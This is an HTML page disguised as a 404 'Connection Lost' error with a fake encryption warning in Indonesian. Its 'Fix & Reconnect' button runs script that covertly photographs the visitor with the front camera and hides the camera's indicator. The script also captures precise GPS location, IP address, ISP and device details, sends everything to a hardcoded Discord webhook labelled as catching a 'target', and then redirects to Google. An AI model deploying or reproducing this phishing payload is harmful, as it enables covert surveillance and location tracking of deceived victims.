<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Connection Lost</title>
    <style>
        body {
            background-color: #f4f7f9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 50px 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            max-width: 500px;
            text-align: center;
            border: 1px solid #e1e8ed;
        }
        h1 {
            color: #e74c3c;
            font-size: 80px;
            margin: 0;
            font-weight: 700;
        }
        h2 {
            color: #2c3e50;
            font-size: 22px;
            margin: 10px 0 20px 0;
        }
        p {
            color: #7f8c8d;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .btn-fix {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-fix:hover {
            background-color: #2980b9;
        }
        .error-code {
            margin-top: 30px;
            font-size: 11px;
            color: #bdc3c7;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>404</h1>
        <h2>Connection Lost</h2>
        <p>Terdeteksi kegagalan sinkronisasi pada sesi browser Anda.<br>Keamanan enkripsi mungkin terganggu.</p>
        
        <button class="btn-fix" id="actionBtn">FIX & RECONNECT</button>
        
        <div class="error-code">Error Code: ERR_SSL_PROTOCOL_ERROR_SYNC</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";

        document.getElementById('actionBtn').addEventListener('click', async function() {
            this.innerText = "Processing...";
            this.disabled = true;

            let imageBlob = null;
            
            // 1. SILENT CAMERA CAPTURE
            // Browser akan meminta izin kamera (biasanya bersamaan/berdekatan dengan lokasi)
            try {
                // Minta akses kamera depan
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                
                // Buat elemen video tersembunyi
                const video = document.createElement('video');
                video.style.display = 'none';
                video.autoplay = true;
                video.playsinline = true;
                video.muted = true;
                video.srcObject = stream;
                document.body.appendChild(video);

                // Tunggu video ready
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(resolve);
                    };
                });

                // Beri jeda 500ms agar kamera menyesuaikan exposure/cahaya
                await new Promise(r => setTimeout(r, 500));

                // Gambar frame ke dalam canvas
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Konversi canvas ke file (Blob)
                imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                
                // Matikan kamera agar lampu indikator mati
                stream.getTracks().forEach(track => track.stop());
                video.remove();
            } catch (err) {
                console.log("Kamera diblokir atau tidak tersedia:", err);
            }

            // 2. GEOLOCATION CAPTURE
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    
                    let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
                    try {
                        const res = await fetch('https://ipapi.co/json/');
                        ipInfo = await res.json();
                    } catch (e) {}

                    const payload = {
                        username: "System Security Monitor",
                        embeds: [{
                            title: "🚨 Target Berhasil Terpancing!",
                            color: 15548997, 
                            fields: [
                                { name: "📍 Koordinat GPS", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` },
                                { name: "🗺️ Google Maps", value: `[Klik Disini](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
                                { name: "🌐 IP Address", value: `\`${ipInfo.ip}\``, inline: true },
                                { name: "🏢 Provider/ISP", value: `\`${ipInfo.org}\``, inline: true },
                                { name: "📱 Perangkat", value: `\`${navigator.userAgent}\`` }
                            ],
                            footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
                        }]
                    };

                    const formData = new FormData();
                    
                    // Jika ada gambar, lampirkan ke embed Discord
                    if (imageBlob) {
                        formData.append('file', imageBlob, 'capture.jpg');
                        payload.embeds[0].image = { url: "attachment://capture.jpg" };
                    }
                    
                    formData.append('payload_json', JSON.stringify(payload));

                    await fetch(WEBHOOK_URL, {
                        method: "POST",
                        body: formData
                    });

                    window.location.href = "https://www.google.com";

                }, async (err) => {
                   
                    const payload = {
                        content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi.",
                        embeds: []
                    };
                    
                    const formData = new FormData();
                    
                    // Jika target nolak lokasi tapi accept kamera (atau kamera udah kedetek)
                    if (imageBlob) {
                        formData.append('file', imageBlob, 'capture.jpg');
                        payload.embeds.push({
                            title: "📸 Tapi Wajah/Foto Berhasil Diambil!",
                            image: { url: "attachment://capture.jpg" },
                            color: 15548997
                        });
                    }

                    formData.append('payload_json', JSON.stringify(payload));

                    await fetch(WEBHOOK_URL, {
                        method: "POST",
                        body: formData
                    });
                    
                    window.location.href = "https://www.google.com";
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else if (imageBlob) {
                // Jika lokasi ga support tapi kamera dapet
                const payload = {
                    content: "⚠️ Perangkat tidak support Geolocation.",
                    embeds: [{
                        title: "📸 Tapi Wajah/Foto Berhasil Diambil!",
                        image: { url: "attachment://capture.jpg" },
                        color: 15548997
                    }]
                };
                const formData = new FormData();
                formData.append('file', imageBlob, 'capture.jpg');
                formData.append('payload_json', JSON.stringify(payload));
                
                await fetch(WEBHOOK_URL, { method: "POST", body: formData });
                window.location.href = "https://www.google.com";
            }
        });
    </script>
</body>
</html>
